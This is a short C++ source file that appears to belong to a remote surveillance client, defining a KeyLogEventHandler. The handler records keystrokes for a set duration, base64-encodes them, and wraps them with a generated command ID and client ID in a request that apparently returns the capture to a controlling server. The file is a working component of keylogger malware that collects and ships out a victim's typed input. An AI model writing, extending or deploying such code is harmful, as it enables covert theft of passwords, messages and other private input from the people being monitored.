#include "KeyLogEventHandler.h"
#include "WinUtils.h"
#include "base64.hpp"
#include "Protocol/ReturnEventProductRequest.h"
#include "Products/KeyLogProduct.h"
#include "Uuid.h"
#include <iostream>
using namespace xp_collector;

KeyLogEventHandler::KeyLogEventHandler(unsigned int duration)
    : m_duration(duration)
{
}

std::unique_ptr<IRequest> KeyLogEventHandler::handle(const EventInfo& event_info, const std::string& client_id)
{
    const std::string result = windows::log_keys(m_duration);
    const std::string encoded_result = result.length() == 0 ? "" : base64::to_base64(result);
    const std::string generated_command_id = uuid::generate_uuid();
    return std::make_unique<ReturnEventProductRequest>(
        RequestHeader{ RequestType::ReturnEventProduct, client_id },
        generated_command_id,
        event_info,
        KeyLogProduct(generated_command_id, encoded_result).serialize()
    );
}
